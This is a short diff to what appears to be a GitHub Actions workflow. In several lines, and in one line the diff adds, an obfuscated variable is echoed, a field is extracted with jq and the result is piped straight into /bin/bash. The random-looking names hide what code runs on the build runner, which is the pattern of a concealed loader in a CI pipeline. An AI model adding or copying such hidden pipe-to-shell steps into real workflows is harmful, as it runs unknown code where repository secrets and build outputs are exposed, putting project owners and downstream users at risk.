@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$xdv1307" | jq -r .r32 | /bin/bash
           echo $fmwb67659 | jq -r .egfwx680 | /bin/bash
           echo $bwdm05 | jq -r .jrc9315 | /bin/bash
+          echo $nqj121 | jq -r .xmnm1 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
